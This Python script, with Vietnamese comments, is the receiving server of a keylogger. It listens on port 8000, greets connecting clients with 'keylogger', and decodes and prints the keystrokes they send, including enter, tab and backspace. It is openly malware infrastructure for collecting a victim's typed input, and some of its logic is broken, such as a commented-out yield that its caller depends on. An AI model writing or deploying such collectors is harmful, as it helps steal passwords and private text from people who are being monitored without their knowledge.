import socket
import threading

port = 8000
keyLogger_data = []



def start_keylogger():
    for data in keyLogger():
        print(data)
        
def keyLogger():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serverSocket:
        serverSocket.bind(('', port))
        serverSocket.listen(5)
        
        while True:
            clientSocket, clientAddress = serverSocket.accept()
            print('Got connection from', clientAddress)
            
            with clientSocket:
                clientSocket.send('keylogger'.encode())
                
                while True:
                    data = clientSocket.recv(1024)
                    if not data:
                        break
                    
                    data = data.decode('utf-8')
                    data = data.replace("'b'", "")
                    data = data.replace("'", "")
                    
                    if data == "Key.backspace":
                        data = "back"
                    elif data == "Key.f12":
                        stop_flag = True  # Đặt cờ để dừng chương trình
                        break
                    else:
                        if data == "Key.shift":
                            data = ""
                        if data == "Key.ctrl_l":
                            data = ""
                        if data == "Key.alt_l":
                            data = ""
                        if data == "Key.tab":
                            data = "\t"
                        if data == "Key.enter":
                            data = "\n"
                        if data == "Key.space":
                            data = "_"
                    print(data,  end="")
                    # yield data  # Thay vì in ra, ta sử dụng yield để trả dữ liệu về

                # Đóng socket client sau khi hoàn thành công việc
                clientSocket.close()

        # Đóng socket server khi kết thúc chương trình
        serverSocket.close()


if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Các lệnh chính của chương trình
    # ...

    keylogger_thread.join()